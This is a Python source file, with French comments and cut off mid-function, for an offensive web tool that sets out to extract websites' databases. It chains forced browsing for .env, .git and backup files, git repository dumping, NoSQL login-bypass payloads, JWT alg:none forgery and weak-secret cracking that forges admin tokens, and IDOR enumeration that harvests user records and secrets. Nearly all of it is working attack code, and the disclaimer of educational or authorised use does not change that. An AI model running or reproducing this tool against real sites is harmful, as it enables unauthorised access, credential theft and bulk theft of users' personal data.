#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
WEB-RECON-EXTRACTOR v1.0
Outil d'extraction de bases de données pour sites web modernes.

But principal : EXTRAIRE la DB (pas juste scanner).

8 vecteurs d'attaque combinés :
  [1] Discovery       — endpoints, swagger, JS parsing, forced browse
  [2] Sensitive files — .git/, .env, backups, configs
  [3] Auth bypass     — NoSQL injections MongoDB
  [4] JWT attacks     — alg:none, secret faible, claim injection
  [5] IDOR scanner    — parcourt /api/users/1..N
  [6] Admin exploit   — appelle endpoints admin avec token
  [7] Services        — MongoDB:27017, Redis:6379, Elasticsearch:9200
  [8] Hunt            — flags, clés API, credentials

Usage éducatif / CTF / pentest autorisé uniquement.
"""

import os
import sys
import re
import json
import time
import base64
import hashlib
import hmac
import socket
import argparse
import threading
import subprocess
import shutil
import csv
from datetime import datetime
from typing import Dict, List, Tuple, Optional, Any, Set
from urllib.parse import urlparse, urljoin, urlencode, parse_qs, urlunparse
from collections import defaultdict, OrderedDict

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass

try:
    import jwt as pyjwt
    JWT_AVAILABLE = True
except ImportError:
    JWT_AVAILABLE = False


# ==================== CONFIGURATION ====================

CONFIG = {
    'timeout': 15,
    'delay': 0.1,
    'threads': 10,
    'user_agent': 'Mozilla/5.0 (X11; Linux x86_64) Web-Recon-Extractor/1.0',
    'verify_ssl': False,
    'output_dir': './extracted',
    'max_idor_ids': 200,
    'max_brute_paths': 500,
    'max_db_dump_size': 100 * 1024 * 1024,  # 100 Mo
    'sleep_threshold': 4,
    'sleep_test': 5,
}

# Marqueurs de succès
SUCCESS_MARKERS = [
    'admin', 'root', 'dashboard', 'welcome', 'token', 'flag', 'secret',
    'flag{', 'FLAG{', 'HTB{', 'CTF{', 'THM{', 'success', 'logged',
    'authenticated', 'session', 'access_token', 'api_key',
]

# Signatures d'erreurs NoSQL
NOSQL_ERRORS = [
    'MongoError', 'MongoServerError', 'BSONTypeError', 'CastError',
    'cannot apply', 'unknown operator', '$where', 'E11000',
    'MongoDB', 'mongodb', 'mongoose',
]

# Endpoints admin à tester
ADMIN_ENDPOINTS = [
    '/api/admin/users', '/api/admin/export', '/api/admin/dump',
    '/api/admin/secrets', '/api/admin/config', '/api/admin/settings',
    '/api/admin/logs', '/api/admin/backup', '/api/users/export',
    '/api/export', '/api/dump', '/api/debug', '/api/v1/users',
    '/api/v1/admin', '/api/internal/users', '/api/system/info',
    '/api/users?limit=99999', '/api/users?page=1&per_page=99999',
    '/api/v1/users?limit=99999', '/users.json', '/api/users.json',
    '/api/all', '/api/list', '/api/data', '/export/users',
    '/admin/users.json', '/admin/export', '/admin/dump',
]

# Chemins sensibles (forced browsing)
SENSITIVE_PATHS = [
    # Git / SVN
    '/.git/config', '/.git/HEAD', '/.git/index', '/.git/logs/HEAD',
    '/.svn/entries', '/.hg/store', '/.bzr/branch-format',
    # Env / configs
    '/.env', '/.env.local', '/.env.prod', '/.env.backup', '/.env.dev',
    '/config.json', '/config.yml', '/config.yaml', '/settings.json',
    '/appsettings.json', '/web.config', '/app.config',
    '/config.js', '/config.php', '/configuration.php',
    '/docker-compose.yml', '/docker-compose.yaml', '/Dockerfile',
    '/.dockerignore', '/docker-compose.override.yml',
    # Backups
    '/backup.sql', '/backup.zip', '/backup.tar.gz', '/backup.json',
    '/db.sql', '/db.sqlite', '/db.json', '/db.dump', '/database.sql',
    '/database.sqlite', '/database.db', '/dump.sql', '/dump.json',
    '/data.json', '/export.json', '/users.json', '/data/users.json',
    '/db_backup.sql', '/backup_2024.sql', '/backup_2025.sql',
    '/www.zip', '/site.zip', '/source.zip', '/app.zip',
    # Package manifests
    '/package.json', '/package-lock.json', '/yarn.lock',
    '/composer.json', '/composer.lock', '/requirements.txt',
    '/Gemfile', '/Gemfile.lock', '/pom.xml', '/build.gradle',
    # CI/CD
    '/.gitlab-ci.yml', '/.travis.yml', '/Jenkinsfile',
    '/.github/workflows/main.yml',
    # API docs
    '/swagger.json', '/swagger.yaml', '/openapi.json', '/openapi.yaml',
    '/api-docs', '/api-docs.json', '/api/swagger.json',
    '/docs', '/redoc', '/graphql', '/graphiql',
    # Logs
    '/access.log', '/error.log', '/debug.log', '/app.log',
    '/logs/app.log', '/var/log/app.log',
    # IDE
    '/.vscode/settings.json', '/.idea/workspace.xml',
    '/.DS_Store', '/Thumbs.db',
    # Kubernetes
    '/k8s/secrets.yml', '/secrets.yml', '/k8s/configmap.yml',
    # Others
    '/robots.txt', '/sitemap.xml', '/.htaccess', '/.htpasswd',
    '/phpinfo.php', '/info.php', '/test.php', '/shell.php',
    '/phpmyadmin/', '/adminer.php', '/adminer/',
    '/server-status', '/server-info',
]

# Endpoints IDOR classiques
IDOR_PATTERNS = [
    '/api/users/{id}', '/api/user/{id}', '/api/users/{id}/profile',
    '/api/orders/{id}', '/api/order/{id}', '/api/documents/{id}',
    '/api/posts/{id}', '/api/messages/{id}', '/api/items/{id}',
    '/api/v1/users/{id}', '/api/v1/user/{id}', '/api/v2/users/{id}',
    '/users/{id}', '/user/{id}', '/profile/{id}', '/account/{id}',
    '/api/accounts/{id}', '/api/profile/{id}',
]

# Payloads NoSQL auth
NOSQL_AUTH_PAYLOADS = {
    'ne_null': {"username": {"$ne": None}, "password": {"$ne": None}},
    'gt_empty': {"username": {"$gt": ""}, "password": {"$gt": ""}},
    'eq_admin_regex': {"username": {"$eq": "admin"}, "password": {"$regex": "^.*"}},
    'in_users': {"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$exists": True}},
    'regex_any': {"username": "admin", "password": {"$regex": "^.*"}},
    'exists_pwd': {"username": "admin", "password": {"$exists": True}},
    'where_true': {"username": {"$where": "return true"}, "password": {"$where": "return true"}},
    'not_null': {"username": {"$not": {"$eq": "wrong"}}, "password": {"$not": {"$eq": "wrong"}}},
    'array_admin': {"username": ["admin", "admin"], "password": {"$ne": "invalid"}},
    'type_string': {"username": "admin", "password": {"$type": "string"}},
}

# Secrets JWT communs
JWT_WEAK_SECRETS = [
    'secret', 'password', 'jwt', 'jwt_secret', 'jwt-secret',
    'supersecret', 'changeme', 'admin', 'key', 'mykey',
    'secretkey', 's3cr3t', 'test', 'dev', 'development',
    'your-256-bit-secret', 'your_jwt_secret',
    'default', 'qwerty', '12345', 'secret123',
]

# Patterns de flags/secrets pour hunt
HUNT_PATTERNS = {
    'flag': r'[A-Za-z0-9_]+\{[^}]{4,200}\}',
    'aws_key': r'AKIA[0-9A-Z]{16}',
    'github_token': r'ghp_[a-zA-Z0-9]{36}',
    'stripe_key': r'sk_live_[a-zA-Z0-9]{24,}',
    'google_api': r'AIza[0-9A-Za-z\-_]{35}',
    'slack_token': r'xox[baprs]-[a-zA-Z0-9\-]+',
    'private_key': r'-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----',
    'jwt': r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+',
    'mongo_uri': r'mongodb(?:\+srv)?://[^\s"\'<>]+',
    'postgres_uri': r'postgres(?:ql)?://[^\s"\'<>]+',
    'mysql_uri': r'mysql://[^\s"\'<>]+',
    'redis_uri': r'redis://[^\s"\'<>]+',
    'password': r'(?:password|passwd|pwd)["\']?\s*[:=]\s*["\']([^"\']{3,80})["\']',
}


# ==================== CLASSE PRINCIPALE ====================

class WebReconExtractor:

    def __init__(self, config: Optional[Dict] = None):
        self.config = dict(CONFIG)
        if config:
            self.config.update(config)

        self.session = self._build_session()
        self.target_url = ""
        self.target_domain = ""
        self.target_host = ""
        self.target_port = None
        self.base_url = ""

        self.results = {
            'target': '',
            'timestamp': datetime.now().isoformat(),
            'endpoints': [],
            'sensitive_files': [],
            'git_dump': {'exposed': False, 'files': []},
            'env_leaked': {'found': False, 'content': ''},
            'tokens': [],
            'jwt_findings': [],
            'idor_data': [],
            'admin_data': [],
            'mongo_dumps': [],
            'services_open': [],
            'flags': [],
            'secrets': [],
            'extracted_users': [],
            'errors': [],
        }

        self.findings = []
        self.all_requests = []
        self.extracted_files = []

        self._print_banner()

    # ==================== SESSION HTTP ====================

    def _build_session(self) -> requests.Session:
        s = requests.Session()
        retry = Retry(total=2, backoff_factor=0.3,
                      status_forcelist=[500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry, pool_connections=20, pool_maxsize=20)
        s.mount('http://', adapter)
        s.mount('https://', adapter)
        s.headers.update({
            'User-Agent': self.config['user_agent'],
            'Accept': 'application/json, text/html, */*',
            'Accept-Language': 'en-US,en;q=0.9',
        })
        return s

    def _request(self, url, method='GET', json_data=None, data=None,
                 params=None, headers=None, timeout=None, allow_redirects=True):
        start = time.time()
        info = {
            'url': url, 'method': method, 'status': None,
            'size': 0, 'elapsed': 0.0, 'body': '',
            'content_type': '', 'headers': {}, 'error': None,
        }
        try:
            req_h = dict(self.session.headers)
            if headers:
                req_h.update(headers)

            kwargs = {
                'timeout': timeout or self.config['timeout'],
                'verify': self.config['verify_ssl'],
                'allow_redirects': allow_redirects,
                'headers': req_h,
            }
            if method.upper() == 'POST':
                if json_data is not None:
                    r = self.session.post(url, json=json_data, **kwargs)
                else:
                    r = self.session.post(url, data=data, **kwargs)
            elif method.upper() == 'HEAD':
                r = self.session.head(url, **kwargs)
            elif method.upper() == 'OPTIONS':
                r = self.session.options(url, **kwargs)
            else:
                r = self.session.get(url, params=params, **kwargs)

            info['status'] = r.status_code
            info['size'] = len(r.content)
            info['elapsed'] = time.time() - start
            info['content_type'] = r.headers.get('Content-Type', '')
            info['body'] = r.text[:200000]  # 200 Ko max en mémoire
            info['headers'] = dict(r.headers)
            info['_response'] = r  # garde pour accéder aux .content si besoin

        except requests.exceptions.Timeout:
            info['elapsed'] = time.time() - start
            info['error'] = 'timeout'
        except Exception as e:
            info['elapsed'] = time.time() - start
            info['error'] = str(e)[:200]

        self.all_requests.append({k: v for k, v in info.items() if not k.startswith('_')})
        return info

    # ==================== OUTILS ====================

    def _c(self, text, color='white', bold=False):
        colors = {
            'red': '\033[91m', 'green': '\033[92m', 'yellow': '\033[93m',
            'blue': '\033[94m', 'magenta': '\033[95m', 'cyan': '\033[96m',
            'white': '\033[97m', 'bold': '\033[1m', 'end': '\033[0m',
        }
        b = colors['bold'] if bold else ''
        return f"{colors.get(color, '')}{b}{text}{colors['end']}"

    def _print_banner(self):
        banner = f"""
{self._c('╔══════════════════════════════════════════════════════════════════════════════╗', 'cyan')}
{self._c('║', 'cyan')}  {self._c('██╗    ██╗███████╗██████╗     ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗', 'red')}  {self._c('║', 'cyan')}
{self._c('║', 'cyan')}  {self._c('██║    ██║██╔════╝██╔══██╗    ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║', 'red')}  {self._c('║', 'cyan')}
{self._c('║', 'cyan')}  {self._c('██║ █╗ ██║█████╗  ██████╔╝    ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║', 'red')}  {self._c('║', 'cyan')}
{self._c('║', 'cyan')}  {self._c('██║███╗██║██╔══╝  ██╔══██╗    ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║', 'red')}  {self._c('║', 'cyan')}
{self._c('║', 'cyan')}  {self._c('╚███╔███╔╝███████╗██████╔╝    ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║', 'red')}  {self._c('║', 'cyan')}
{self._c('║', 'cyan')}  {self._c(' ╚══╝╚══╝ ╚══════╝╚═════╝     ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝', 'red')}  {self._c('║', 'cyan')}
{self._c('║', 'cyan')}  {self._c('     WEB-RECON-EXTRACTOR v1.0 — JATHNIEL EDITION', 'yellow')}                  {self._c('║', 'cyan')}
{self._c('║', 'cyan')}  {self._c('     🎯 Extraction de bases de données sur sites modernes', 'green')}            {self._c('║', 'cyan')}
{self._c('║', 'cyan')}  {self._c('          🛡️  Usage éducatif / pentest autorisé', 'magenta')}                    {self._c('║', 'cyan')}
{self._c('╚══════════════════════════════════════════════════════════════════════════════╝', 'cyan')}
        """
        print(banner)

    def _section(self, title):
        print(f"\n{self._c('═' * 78, 'cyan')}")
        print(f"{self._c('▶ ' + title, 'bold', )}")
        print(f"{self._c('═' * 78, 'cyan')}")

    def _log_finding(self, category, detail, evidence=None):
        finding = {
            'category': category,
            'detail': detail,
            'evidence': evidence or {},
            'time': datetime.now().isoformat(),
        }
        self.findings.append(finding)
        return finding

    # ==================== PHASE 1 : DISCOVERY ====================

    def phase_1_discovery(self):
        self._section("PHASE 1 — DISCOVERY (endpoints, swagger, JS parsing)")

        endpoints = set()
        base = self.base_url

        # 1. Endpoints classiques + swagger
        swagger_paths = ['/swagger.json', '/openapi.json', '/api-docs',
                         '/api/swagger.json', '/v2/api-docs', '/api-docs.json']
        for sp in swagger_paths:
            url = urljoin(base, sp)
            info = self._request(url)
            if info['status'] == 200 and info['body']:
                try:
                    spec = json.loads(info['body'])
                    paths = spec.get('paths', {})
                    for p in paths:
                        endpoints.add(p)
                    print(f"  {self._c('✓', 'green')} Swagger trouvé : {sp} ({len(paths)} endpoints)")
                    self._log_finding('swagger', f'Swagger exposé : {sp}', {'count': len(paths)})
                    self.results['sensitive_files'].append({
                        'path': sp, 'url': url, 'size': info['size'], 'type': 'swagger'
                    })
                except Exception:
                    pass
            time.sleep(self.config['delay'])

        # 2. Parse de la page d'accueil + JS
        info = self._request(base)
        if info['status'] == 200:
            html = info['body']
            # Extraction de toutes les URLs du HTML
            for match in re.finditer(r'["\'](/api/[a-zA-Z0-9_\-/]+)["\']', html):
                endpoints.add(match.group(1))
            for match in re.finditer(r'["\'](/v[0-9]+/[a-zA-Z0-9_\-/]+)["\']', html):
                endpoints.add(match.group(1))

            # Trouve les JS et les parse aussi
            js_urls = set()
            for m in re.finditer(r'<script[^>]+src=["\']([^"\']+)["\']', html):
                js_urls.add(urljoin(base, m.group(1)))
            for m in re.finditer(r'["\'](/static/[^"\']+\.js)["\']', html):
                js_urls.add(urljoin(base, m.group(1)))
            for m in re.finditer(r'["\'](/js/[^"\']+\.js)["\']', html):
                js_urls.add(urljoin(base, m.group(1)))

            print(f"  {self._c('ℹ', 'blue')} {len(js_urls)} fichier(s) JS à analyser")

            for js_url in list(js_urls)[:30]:  # limite
                jinfo = self._request(js_url)
                if jinfo['status'] == 200:
                    js_body = jinfo['body']
                    for match in re.finditer(r'["\'](/api/[a-zA-Z0-9_\-/{}]+)["\']', js_body):
                        endpoints.add(match.group(1))
                    for match in re.finditer(r'["\'](/v[0-9]+/[a-zA-Z0-9_\-/{}]+)["\']', js_body):
                        endpoints.add(match.group(1))
                    # Cherche les fetch/axios
                    for match in re.finditer(r'(?:fetch|axios\.(?:get|post|put|delete))\s*\(\s*["\']([^"\']+)["\']', js_body):
                        u = match.group(1)
                        if u.startswith('/'):
                            endpoints.add(u)
                time.sleep(self.config['delay'] * 0.3)

        # 3. Forced browse sur routes classiques
        print(f"  {self._c('ℹ', 'blue')} Forced browse sur {len(ADMIN_ENDPOINTS)} endpoints admin...")
        for ep in ADMIN_ENDPOINTS:
            url = urljoin(base, ep)
            info = self._request(url, allow_redirects=False)
            if info['status'] in (200, 401, 403, 405, 500):
                if info['status'] in (200, 401, 403, 500):
                    endpoints.add(ep)
            time.sleep(self.config['delay'] * 0.3)

        # 4. Endpoints IDOR (avec placeholder)
        for pat in IDOR_PATTERNS:
            endpoints.add(pat)

        self.results['endpoints'] = sorted(endpoints)
        print(f"\n  {self._c('✓', 'green')} {len(endpoints)} endpoints découverts")
        for ep in sorted(endpoints)[:20]:
            print(f"    • {ep}")
        if len(endpoints) > 20:
            print(f"    ... +{len(endpoints) - 20} autres")

        self._log_finding('discovery', f'{len(endpoints)} endpoints trouvés',
                          {'endpoints': self.results['endpoints'][:100]})
        return self.results['endpoints']

    # ==================== PHASE 2 : SENSITIVE FILES ====================

    def phase_2_sensitive_files(self):
        self._section("PHASE 2 — FICHIERS SENSIBLES (.git, .env, backups)")
        base = self.base_url
        found = []

        # On teste en HEAD d'abord, GET si HEAD n'est pas autorisé
        for path in SENSITIVE_PATHS:
            url = urljoin(base, path)
            info = self._request(url, allow_redirects=False)

            if info['status'] == 200:
                # Vérifier que ce n'est pas une page 404 custom
                body = info['body']
                ct = info['content_type'].lower()

                # Détecter faux positif 404
                is_404_fake = False
                if 'text/html' in ct and len(body) < 5000:
                    low = body.lower()
                    if 'not found' in low or '404' in low[:200]:
                        is_404_fake = True

                if not is_404_fake:
                    found.append({'path': path, 'url': url,
                                  'size': info['size'], 'ct': ct})
                    print(f"  {self._c('🔴', 'red')} [{info['status']}] {path} ({info['size']} o)")
                    self.results['sensitive_files'].append({
                        'path': path, 'url': url,
                        'size': info['size'], 'content_type': ct,
                        'preview': body[:500],
                    })

                    # Si .env → on sauvegarde
                    if path.endswith('.env') or 'env' in path:
                        self.results['env_leaked'] = {
                            'found': True, 'url': url, 'content': body
                        }
                        self._log_finding('env_leaked', f'.env trouvé : {path}',
                                          {'preview': body[:500]})
                        self._extract_env_secrets(body)

                    # Si .git/config → on tente le dump
                    if '.git' in path:
                        self.results['git_dump']['exposed'] = True
                        self._log_finding('git_exposed', f'.git accessible : {path}')

            elif info['status'] in (401, 403):
                print(f"  {self._c('🟡', 'yellow')} [{info['status']}] {path} (protégé mais existe)")

            time.sleep(self.config['delay'] * 0.3)

        # Dump .git complet si exposé
        if self.results['git_dump']['exposed']:
            self._dump_git_repo()

        print(f"\n  {self._c('✓', 'green')} {len(found)} fichier(s) sensible(s) trouvé(s)")
        return found

    def _extract_env_secrets(self, content):
        """Extrait credentials/secrets d'un .env."""
        for line in content.splitlines():
            if '=' in line and not line.strip().startswith('#'):
                k, v = line.split('=', 1)
                k = k.strip()
                v = v.strip().strip('"').strip("'")
                if any(x in k.upper() for x in ['DB', 'DATABASE', 'MONGO', 'MYSQL',
                                                  'POSTGRES', 'REDIS', 'SECRET',
                                                  'KEY', 'TOKEN', 'PASSWORD',
                                                  'JWT', 'API']):
                    self.results['secrets'].append({
                        'source': '.env', 'key': k, 'value': v[:200],
                    })
                    print(f"      {self._c('🔑', 'yellow')} {k} = {v[:80]}")

    def _dump_git_repo(self):
        """Tente un dump .git via git-dumper ou wget."""
        print(f"\n  {self._c('🚨', 'red', bold=True)} .git/ exposé → tentative de dump...")

        dump_dir = f"{self._output_dir()}/git_dump"
        os.makedirs(dump_dir, exist_ok=True)

        # Test : HEAD accessible ?
        head = self._request(urljoin(self.base_url, '/.git/HEAD'))
        if head['status'] != 200:
            print(f"  {self._c('✗', 'yellow')} .git/HEAD non accessible")
            return

        # git-dumper si dispo
        if shutil.which('git-dumper'):
            try:
                git_url = urljoin(self.base_url, '/.git/')
                subprocess.run(['git-dumper', git_url, dump_dir],
                               timeout=180, check=False,
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(f"  {self._c('✓', 'green')} Repo dumpé dans {dump_dir}")

                # Cherche des secrets dans le dump
                self._grep_secrets_in_dir(dump_dir)
            except Exception as e:
                print(f"  {self._c('✗', 'yellow')} git-dumper échec : {e}")
        else:
            print(f"  {self._c('ℹ', 'blue')} git-dumper non installé, dump manuel...")
            # Dump manuel des fichiers clés
            for path in ['.git/HEAD', '.git/config', '.git/index',
                         '.git/packed-refs', '.git/logs/HEAD']:
                url = urljoin(self.base_url, '/' + path)
                info = self._request(url)
                if info['status'] == 200:
                    fname = path.replace('/', '_')
                    fpath = os.path.join(dump_dir, fname)
                    with open(fpath, 'w', errors='ignore') as f:
                        f.write(info['body'])
                    print(f"    ✓ {path}")

    def _grep_secrets_in_dir(self, directory):
        """Cherche des secrets dans un dossier dumpé."""
        for root, _, files in os.walk(directory):
            for fname in files:
                fpath = os.path.join(root, fname)
                try:
                    with open(fpath, 'r', errors='ignore') as f:
                        content = f.read()
                    for name, pattern in HUNT_PATTERNS.items():
                        for m in re.findall(pattern, content, re.IGNORECASE):
                            m_str = m if isinstance(m, str) else str(m)
                            self.results['secrets'].append({
                                'source': fpath, 'pattern': name, 'value': m_str[:300],
                            })
                            print(f"      {self._c('💎', 'magenta')} {name} dans {fname}: {m_str[:100]}")
                except Exception:
                    pass

    # ==================== PHASE 3 : AUTH BYPASS ====================

    def phase_3_auth_bypass(self, login_path='/api/login',
                            username_field='username',
                            password_field='password',
                            extra_static=None):
        self._section(f"PHASE 3 — AUTH BYPASS NoSQL ({login_path})")
        extra_static = extra_static or {}

        url = urljoin(self.base_url, login_path)

        # Baseline
        base_payload = {
            username_field: "nonexistent_user_xyz",
            password_field: "wrong_pass_xyz",
        }
        base_payload.update(extra_static)
        baseline = self._request(url, 'POST', json_data=base_payload)
        print(f"  📏 Baseline : HTTP {baseline['status']} | {baseline['size']}o")

        if baseline['error']:
            print(f"  {self._c('✗', 'red')} Baseline échouée : {baseline['error']}")
            return None

        baseline_markers = self._find_markers(baseline['body'])
        baseline_size = baseline['size']

        success_token = None
        for name, base_nosql in NOSQL_AUTH_PAYLOADS.items():
            payload = {}
            for k, v in base_nosql.items():
                if k == 'username':
                    payload[username_field] = v
                elif k == 'password':
                    payload[password_field] = v
                else:
                    payload[k] = v
            payload.update(extra_static)

            info = self._request(url, 'POST', json_data=payload)
            markers = self._find_markers(info['body'])
            nosql_errors = self._find_nosql_errors(info['body'])

            is_bypass = False
            reasons = []

            if info['status'] == 200 and baseline['status'] != 200:
                is_bypass = True
                reasons.append(f"HTTP {baseline['status']} → 200")
            if info['status'] == 200 and markers and not baseline_markers:
                is_bypass = True
                reasons.append(f"marqueurs: {','.join(markers[:2])}")
            if len(info['body']) > baseline_size * 2 and info['status'] == 200:
                is_bypass = True
                reasons.append(f"taille {baseline_size} → {info['size']}")
            if nosql_errors:
                reasons.append(f"erreur NoSQL: {nosql_errors[0]}")

            marker_str = self._c('🔴', 'red') if is_bypass else '  '
            print(f"  {marker_str} {name:20s} | HTTP {info['status']} | {info['size']:>6}o", end="")
            if reasons:
                print(f" | {self._c(', '.join(reasons[:2]), 'yellow')}")
            else:
                print()

            if is_bypass:
                self._log_finding('auth_bypass', f'Bypass avec {name}',
                                  {'payload': payload, 'reasons': reasons})

                # Extraction du token
                token = self._extract_token(info['body'], info['headers'])
                if token:
                    self.results['tokens'].append({
                        'source': f'auth_bypass:{name}',
                        'token': token,
                        'type': self._detect_token_type(token),
                    })
                    success_token = token
                    print(f"      {self._c('🔑', 'green')} Token récupéré : {token[:60]}...")

            time.sleep(self.config['delay'])

        return success_token

    def _extract_token(self, body, headers):
        """Cherche un token JWT/session dans le body ou les headers."""
        # JWT dans le body
        jwt_pattern = r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+'
        m = re.search(jwt_pattern, body)
        if m:
            return m.group(0)

        # JSON {token: "..."} ou {access_token: "..."}
        try:
            data = json.loads(body)
            for key in ['token', 'access_token', 'accessToken', 'jwt',
                        'session', 'sessionId', 'auth_token']:
                if key in data and isinstance(data[key], str):
                    return data[key]
                # nested
                if 'data' in data and isinstance(data['data'], dict):
                    for k2 in ['token', 'access_token', 'jwt']:
                        if k2 in data['data']:
                            return data['data'][k2]
        except Exception:
            pass

        # Cookie de session
        for hname, hval in headers.items():
            if hname.lower() == 'set-cookie':
                m = re.search(r'(?:session|token|jwt|auth)=([^;]+)', hval)
                if m:
                    return m.group(1)

        return None

    def _detect_token_type(self, token):
        if re.match(r'eyJ[A-Za-z0-9_\-]+\.eyJ', token):
            return 'JWT'
        if len(token) > 30 and all(c.isalnum() or c in '-_' for c in token):
            return 'session_token'
        return 'unknown'

    def _find_markers(self, body):
        low = body.lower()
        return [m for m in SUCCESS_MARKERS if m.lower() in low]

    def _find_nosql_errors(self, body):
        return [e for e in NOSQL_ERRORS if e.lower() in body.lower()]

    # ==================== PHASE 4 : JWT ATTACKS ====================

    def phase_4_jwt_attacks(self):
        self._section("PHASE 4 — JWT ATTACKS (alg:none, secret faible)")

        if not JWT_AVAILABLE:
            print(f"  {self._c('✗', 'yellow')} PyJWT non installé. Installe : pip install PyJWT")
            return

        # Récupère des JWT depuis les tokens déjà trouvés ou depuis la page d'accueil
        jwts_to_test = [t['token'] for t in self.results['tokens']
                        if t['type'] == 'JWT']

        # Essayer d'en trouver d'autres dans la page
        if not jwts_to_test:
            info = self._request(self.base_url)
            jwts_to_test = re.findall(r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+',
                                       info['body'])

        if not jwts_to_test:
            print(f"  {self._c('ℹ', 'blue')} Aucun JWT à tester")
            return

        for jwt_token in jwts_to_test[:5]:
            try:
                # Décoder sans vérifier
                header = pyjwt.get_unverified_header(jwt_token)
                payload = pyjwt.decode(jwt_token, options={"verify_signature": False})

                print(f"\n  JWT trouvé : {jwt_token[:50]}...")
                print(f"    Algo   : {header.get('alg')}")
                print(f"    Claims : {list(payload.keys())}")

                # Test 1 : alg:none
                none_header = dict(header)
                none_header['alg'] = 'none'
                none_token = (base64.urlsafe_b64encode(json.dumps(none_header).encode()).rstrip(b'=').decode() +
                              '.' +
                              base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode() +
                              '.')
                self._log_finding('jwt_alg_none_test', 'JWT alg:none forgé',
                                  {'original': jwt_token[:50], 'forged': none_token[:50]})

                # Test 2 : secrets faibles
                print(f"    Test {len(JWT_WEAK_SECRETS)} secrets faibles...")
                cracked_secret = None
                for secret in JWT_WEAK_SECRETS:
                    try:
                        pyjwt.decode(jwt_token, secret, algorithms=['HS256', 'HS384', 'HS512'])
                        cracked_secret = secret
                        break
                    except Exception:
                        pass

                if cracked_secret:
                    print(f"    {self._c('💥 SECRET CRACKÉ', 'red', bold=True)} : {cracked_secret}")
                    self._log_finding('jwt_secret_cracked', f'JWT secret cracké: {cracked_secret}',
                                      {'jwt': jwt_token[:50], 'secret': cracked_secret})

                    # Forge un JWT admin
                    admin_claims = dict(payload)
                    admin_claims['role'] = 'admin'
                    admin_claims['isAdmin'] = True
                    admin_claims['admin'] = True
                    forged = pyjwt.encode(admin_claims, cracked_secret, algorithm='HS256')
                    self.results['tokens'].append({
                        'source': 'jwt_forged',
                        'token': forged,
                        'type': 'JWT',
                        'note': 'Forge admin'
                    })
                    print(f"    {self._c('🔑', 'green')} Token admin forgé !")
                else:
                    print(f"    ✗ Aucun secret faible trouvé")

                self.results['jwt_findings'].append({
                    'jwt': jwt_token[:100],
                    'header': header,
                    'payload': payload,
                    'cracked_secret': cracked_secret,
                })
            except Exception as e:
                print(f"  {self._c('✗', 'yellow')} Erreur JWT : {e}")

    # ==================== PHASE 5 : IDOR ====================

    def phase_5_idor(self):
        self._section("PHASE 5 — IDOR SCANNER")

        # On cherche des endpoints IDOR dans ceux découverts
        idor_candidates = []
        for ep in self.results['endpoints']:
            if re.search(r'/\d+', ep):
                continue  # déjà concret
            if '{id}' in ep:
                idor_candidates.append(ep)
            elif re.search(r'/api/(?:v\d+/)?(?:users|orders|documents|posts|items|messages|profile|account)s?/?$', ep):
                # /api/users → on essaie /api/users/1, /api/users/2...
                idor_candidates.append(ep.rstrip('/') + '/{id}')

        # Si aucun, on essaie les patterns par défaut
        if not idor_candidates:
            idor_candidates = IDOR_PATTERNS[:6]

        # Limiter
        idor_candidates = idor_candidates[:10]

        headers_auth = self._auth_headers()

        for pattern in idor_candidates:
            print(f"\n  {self._c('ℹ', 'blue')} Test IDOR sur : {pattern}")
            extracted_objects = []
            errors = 0

            # Détermine si on utilise range 1..N
            for i in range(1, self.config['max_idor_ids'] + 1):
                url = urljoin(self.base_url, pattern.replace('{id}', str(i)))
                info = self._request(url, headers=headers_auth)

                if info['status'] == 200 and info['body']:
                    # Vérifie que c'est du JSON ou du contenu utile
                    is_json = 'application/json' in info['content_type']
                    is_useful = is_json or any(x in info['body'] for x in ['@', 'user', 'id', 'name'])

                    if is_useful:
                        try:
                            data = json.loads(info['body'])
                            extracted_objects.append({'id': i, 'data': data})
                            if i <= 3 or i % 50 == 0:
                                print(f"    {self._c('🔴', 'red')} ID {i} → {len(info['body'])}o récupérés")
                        except Exception:
                            extracted_objects.append({'id': i, 'data': info['body'][:2000]})
                            print(f"    {self._c('🔴', 'red')} ID {i} → {len(info['body'])}o (non-JSON)")
                elif info['status'] == 404:
                    errors += 1
                    if errors > 5 and not extracted_objects:
                        # Beaucoup de 404 consécutifs, on arrête
                        break
                time.sleep(self.config['delay'] * 0.5)

            if extracted_objects:
                self.results['idor_data'].append({
                    'pattern': pattern,
                    'count': len(extracted_objects),
                    'objects': extracted_objects,
                })
                self._log_finding('idor', f'IDOR sur {pattern} : {len(extracted_objects)} objets',
                                  {'pattern': pattern, 'count': len(extracted_objects)})
                print(f"  {self._c('✓', 'green')} {len(extracted_objects)} objets extraits via IDOR")

                # Cherche les users pour les ajouter à la liste
                self._extract_users_from_idor(extracted_objects)

    def _auth_headers(self):
        """Retourne les headers avec le premier token trouvé."""
        if not self.results['tokens']:
            return {}
        token = self.results['tokens'][0]['token']
        return {
            'Authorization': f'Bearer {token}',
            'X-Auth-Token': token,
            'Cookie': f'token={token}; session={token}',
        }

    def _extract_users_from_idor(self, objects):
        """Identifie et stocke les users extraits."""
        for obj in objects:
            data = obj.get('data')
            if isinstance(data, dict):
                # Aplatir si nested
                if 'data' in data and isinstance(data['data'], dict):
                    data = data['data']
                if 'user' in data and isinstance(data['user'], dict):
                    data = data['user']

                # Vérifier que ça ressemble à un user
                if any(k in str(data).lower() for k in ['email', 'username', 'password']):
